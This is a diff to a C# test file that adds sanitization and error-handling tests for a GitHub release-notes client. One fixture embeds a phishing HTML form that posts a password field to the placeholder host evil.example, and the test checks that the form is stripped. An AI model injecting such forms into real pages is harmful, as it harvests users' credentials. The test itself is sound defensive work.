@@ -46,6 +46,36 @@ public class GitHubReleaseClientTests
     }
 
     [Fact]
+    public async Task NotesKeepNoFormControlsAndNoRelativeLinks()
+    {
+        var client = CreateClient(_ => Json("""
+            {
+              "tag_name": "v0.2.8",
+              "html_url": "https://github.com/nightscout/nocturne/releases/tag/v0.2.8",
+              "body_html": "<form action=\"https://evil.example/x\" method=\"post\"><input name=\"password\" type=\"password\"><button>Sign in</button></form><a href=\"/nightscout/nocturne/pull/1\">PR</a>"
+            }
+            """));
+
+        var release = await client.GetLatestAsync(CancellationToken.None);
+
+        release!.NotesHtml.Should().NotContain("<form").And.NotContain("<input").And.NotContain("<button")
+            .And.NotContain("name=");
+        release.NotesHtml.Should().Contain("href=\"https://github.com/nightscout/nocturne/pull/1\"");
+    }
+
+    [Theory]
+    [InlineData(HttpStatusCode.Forbidden)]
+    [InlineData(HttpStatusCode.TooManyRequests)]
+    [InlineData(HttpStatusCode.BadGateway)]
+    public async Task AnErrorFromGitHubIsAFailedReadNotAnAbsentRelease(HttpStatusCode status)
+    {
+        var client = CreateClient(_ => new HttpResponseMessage(status));
+
+        await client.Invoking(c => c.GetLatestAsync(CancellationToken.None))
+            .Should().ThrowAsync<HttpRequestException>();
+    }
+
+    [Fact]
     public async Task AsksForTheRunningVersionByItsTag()
     {
         HttpRequestMessage? sent = null;
